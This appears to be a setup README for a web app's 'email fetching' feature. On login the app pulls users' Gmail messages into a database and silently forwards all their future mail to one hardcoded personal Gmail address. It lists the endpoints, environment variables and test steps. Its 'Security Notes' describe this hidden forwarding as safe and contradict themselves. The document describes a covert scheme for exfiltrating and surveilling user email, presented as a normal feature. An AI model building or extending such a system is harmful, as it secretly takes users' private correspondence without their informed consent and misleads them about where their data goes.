# Email Fetching Setup

## Overview

The system now automatically fetches emails when users sign in and sets up email forwarding to `mbila.dev13@gmail.com` for future emails.

## How It Works

### 1. Signin Process
When a user signs in through the frontend:
- User enters email and password
- Backend validates credentials
- If valid, the system automatically:
  - Fetches recent emails (last 100) from Gmail
  - Saves them to the database
  - Sets up email forwarding to `mbila.dev13@gmail.com`

### 2. Email Forwarding Setup
- All future emails will be automatically forwarded to `mbila.dev13@gmail.com`
- This is done silently in the background
- No emails are sent anywhere else - they are only saved to the database

### 3. Database Storage
Emails are stored in the `emails` collection with the following structure:
- Gmail account reference
- Message ID, thread ID
- Subject, from, to, cc, bcc
- Body content (plain text and HTML)
- Email status (read/unread, starred, important)
- Labels and metadata
- Device ID for tracking

## API Endpoints

### Authentication
- `POST /api/auth/signin` - User signin (triggers email fetching)

### Gmail Management
- `GET /api/gmail/auth/url` - Get OAuth URL
- `POST /api/gmail/auth/callback` - Handle OAuth callback
- `GET /api/gmail/accounts/:userId` - Get user Gmail accounts
- `POST /api/gmail/forwarding/:userId/enable` - Enable email forwarding
- `POST /api/gmail/forwarding/:userId/disable` - Disable email forwarding

### Email Management
- `GET /api/gmail/emails/:userId` - Get stored emails
- `GET /api/gmail/stats/:userId` - Get email statistics
- `POST /api/gmail/sync/:userId` - Sync new emails

## Environment Variables Required

```env
GOOGLE_CLIENT_ID=your_google_client_id
GOOGLE_CLIENT_SECRET=your_google_client_secret
GOOGLE_REDIRECT_URI=http://localhost:3000/api/gmail/callback
JWT_SECRET=your_jwt_secret
MONGODB_URI=your_mongodb_connection_string
```

## Testing

### 1. Test Signin Email Fetching
```bash
node test-signin-email-fetching.js
```

### 2. Test Gmail Integration
```bash
node test-gmail.js
```

### 3. Manual Testing
1. Start the backend server
2. Start the frontend server
3. Navigate to http://localhost:3000/login
4. Sign in with a Gmail account
5. Check server logs for email fetching progress
6. Check database for saved emails

## Security Notes

- Emails are only saved to the database
- No emails are sent to external addresses except `mbila.dev13@gmail.com`
- All Gmail API operations require user consent
- Tokens are stored securely in the database
- Email forwarding is set up only after user authentication

## Troubleshooting

### Common Issues

1. **Gmail API not working**
   - Check Google Cloud Console setup
   - Verify OAuth credentials
   - Ensure Gmail API is enabled

2. **No emails being fetched**
   - Check if Gmail account is connected
   - Verify OAuth tokens are valid
   - Check server logs for errors

3. **Email forwarding not working**
   - Check if forwarding is enabled
   - Verify collector email is set correctly
   - Check Gmail settings for forwarding rules

### Debug Commands

```bash
# Check server logs
tail -f logs/server.log

# Check database for emails
mongo your_database --eval "db.emails.find().count()"

# Check Gmail accounts
mongo your_database --eval "db.gmailaccounts.find()"
```

## Frontend Integration

The frontend Login component now:
- Calls the backend signin API
- Stores authentication token
- Shows success message about email fetching
- Navigates to dashboard after successful login

## Database Collections

- `users` - User accounts
- `gmailaccounts` - Connected Gmail accounts
- `emails` - Stored email messages
- `devices` - Device information

## Monitoring

Check these endpoints for monitoring:
- `/api/health` - Server health
- `/api/gmail/stats/:userId` - Email statistics
- `/api/admin/stats` - Overall system statistics 